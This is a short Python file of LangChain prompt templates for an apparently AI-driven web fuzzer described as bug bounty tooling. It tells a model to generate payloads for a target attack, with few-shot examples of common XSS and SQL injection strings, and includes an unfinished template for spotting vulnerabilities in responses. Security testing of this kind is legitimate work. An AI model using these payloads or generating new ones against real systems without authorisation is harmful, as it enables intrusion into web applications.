from langchain import PromptTemplate

fuzz_template = """
You are a proxy fuzzing http requests for a bug bounty. You are given:
    (1) the route being fuzzed
	(2) a parameter to fuzz and its current value
	(3) a target attack. For example, sql injection, stored-xss, reflected-xss, etc.

You must submit a comma seperated list of payloads you believe will achieve the target attack, ending with an <END>.

Here are some examples:

EXAMPLE 1:
ROUTE BEING FUZZED: /user/submit
parameter: name
value: user
target attack: xss
YOUR FUZZING PAYLOADS: <script>alert(1)</script>,"-prompt(8)-",'-prompt(8)-',";a=prompt,a()//,';a=prompt,a()//,'-eval("window['pro'%2B'mpt'](8)")-',<image/src/onerror=prompt(8)>,<img/src/onerror=prompt(8)>,<END>
==================================================

EXAMPLE 2:
ROUTE BEING FUZZED: /class/grade
parameter: student_id
value: 6
target attack: sql injection
YOUR FUZZING PAYLOADS: ' OR '1,' OR 1 -- -," OR "" = "," OR 1 = 1 -- -,' OR '' = ','=','LIKE','=0--+,OR 1=1,<END>

==================================================

ROUTE BEING FUZZED: {route}
parameter: {parameter}
value: {value}
target attack: {target_attack}
YOUR FUZZING PAYLOADS:
"""

fuzz_prompt = PromptTemplate(
    input_variables=["route", "parameter", "value", "target_attack"],
    template=fuzz_template,
)

vuln_recognition_template = """
You are a proxy checking http responses for vulnerabilities. You are given:

(1) A description of the technology stack of the target application
(2) the parameter that was fuzzed
(3) the payload that was sent
(4) the response that was received
{tech_stack}
{parameter}
{payload}
{response}
"""

vuln_recog_prompt = PromptTemplate(
    input_variables=["tech_stack", "parameter", "payload", "response"],
    template=vuln_recognition_template,
)
